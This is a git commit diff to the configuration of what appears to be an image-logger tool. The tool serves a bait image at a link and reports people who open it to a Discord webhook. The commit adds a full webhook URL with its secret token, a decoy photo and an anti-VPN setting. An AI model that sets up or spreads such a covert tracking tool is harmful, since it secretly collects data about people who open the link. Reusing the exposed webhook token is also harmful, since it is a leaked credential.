f938ed0dc3d225b2f70ba6c03c736b845b09c5a8
Braindead_73 <eisleyt123@gmail.com>
2025-08-19 08:21:22 -0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1406824133328900097/f5Gr1WWVapgHfmW-TAMofKX-btH9TXkpUaB1LDS54ytCbqP8fMRtiE10VObKremRUCCx",
+    "image": "https://unsplash.com/photos/a-laptop-computer-with-a-blank-screen-on-a-purple-background-leJqoRS1ZSU", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -32,7 +32,7 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 2, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
